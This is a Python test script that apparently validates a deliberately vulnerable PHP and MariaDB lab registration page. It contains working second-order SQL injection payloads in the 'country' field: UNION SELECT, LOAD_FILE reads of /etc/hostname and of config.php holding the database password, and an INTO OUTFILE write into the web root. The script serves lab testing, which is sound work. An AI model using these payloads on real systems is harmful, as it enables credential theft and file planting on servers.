#!/usr/bin/env python3
"""Outside-in functional verification of real PHP, MariaDB and registration flow."""
import hashlib
import os
import html
import http.cookiejar
import re
import secrets
import urllib.parse
import urllib.request

BASE = "http://validation-target"
cookies = http.cookiejar.CookieJar()
client = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookies))


def visit(path, values=None):
    form = urllib.parse.urlencode(values).encode() if values is not None else None
    with client.open(BASE + path, data=form, timeout=12) as response:
        return response.status, response.read().decode("utf-8", "replace")


count = 0


def register(country, name=None):
    global count
    count += 1
    name = name or "validation-test-" + secrets.token_hex(4) + "-" + str(count)
    status, page = visit("/", {"username": name, "country": country})
    assert status == 200 and "Welcome " + name in page
    assert cookies._cookies["validation-target"]["/"]["user"].value == hashlib.md5(name.encode()).hexdigest()
    return html.unescape(page)


status, home = visit("/")
assert status == 200
assert "Join the UHC - September Qualifiers" in home
assert 'name="username"' in home and 'name="country"' in home
print("PASS: original-style UHC September registration form", flush=True)

_, config_page = visit("/config.php")
assert config_page.strip() == "", "PHP configuration source was publicly served"
ordinary = register("Belgium")
assert "Other Players In Belgium" in ordinary
print("PASS: PHP-FPM executes correctly, real MariaDB row and MD5 cookie", flush=True)

marker = "second-order-" + secrets.token_hex(5)
injected = register("Belgium' UNION SELECT '" + marker + "'-- -")
assert marker in injected
print("PASS: stored country later evaluated by a real MariaDB UNION SELECT", flush=True)

read = register("Belgium' UNION SELECT LOAD_FILE('/etc/hostname')-- -")
assert "Other Players In Belgium" in read
assert re.search(r"<li>[0-9a-f]{12}</li>", read)
print("PASS: native MariaDB FILE permission reads a real non-secret OS file", flush=True)

source = register("Belgium' UNION SELECT LOAD_FILE('/var/www/html/config.php')-- -")
assert "$password" in source and "new mysqli" in source
print("PASS: real PHP runtime configuration readable through database FILE privilege", flush=True)

file_name = os.environ.get("VALIDATION_TEST_FILENAME", "validation-probe-ci.txt")
plain_text = "validation-into-outfile-" + secrets.token_hex(4)
value = plain_text.encode().hex()
register("Belgium' UNION SELECT 0x" + value + " INTO OUTFILE '/var/www/html/" + file_name + "'-- -")
_, output = visit("/" + file_name)
assert output.strip() == plain_text
print("PASS: native MariaDB INTO OUTFILE creates an HTTP-served ordinary text file", flush=True)
